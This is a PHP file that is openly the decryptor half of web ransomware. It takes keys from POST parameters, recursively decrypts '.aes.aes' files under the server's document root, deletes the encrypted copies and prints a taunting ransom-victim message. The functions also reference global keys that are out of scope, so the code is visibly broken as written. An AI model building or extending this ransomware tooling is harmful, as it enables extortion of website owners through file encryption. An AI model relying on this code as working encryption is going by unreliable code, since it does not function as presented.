<?php
function encrypt_decrypt($action, $string, $secret_key, $secret_iv) {
    $output = false;

    $encrypt_method = "AES-256-CBC";

    $key = hash('sha256', $secret_key);
    
    $iv = substr(hash('sha256', $secret_iv), 0, 16);

    if( $action == 'encrypt' ) {
        $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
        $output = base64_encode($output);
    }
    else if( $action == 'decrypt' ){
        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
    }

    return $output;
}

function decfile($filename){
	if (strpos($filename, '.aes.aes') === FALSE) {
	return;
	}
	$encrypted2 = file_get_contents($filename);
	$encrypted = encrypt_decrypt('decrypt', $encrypted2, $key2, $iv);
	$decrypted = encrypt_decrypt('decrypt', $encrypted, $key1, $iv);
	file_put_contents(substr($filename, 0, -8), $decrypted);
	unlink($filename);
}

function decdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				decdir($dir."/".$file);
			}else {
				decfile($dir."/".$file);
		}
	}
}

$key1 = $_POST['key1'];
$key2 = $_POST['key2'];
$iv = $_POST['iv'];

if(isset($_POST['key1']) && isset($_POST['key2']) && isset($_POST['iv'])){
	decdir($_SERVER['DOCUMENT_ROOT']);
	echo "Ransomware has now Decrypted your root directory, and you can now return to what you were doing like nothing has happened :D";
}
?>
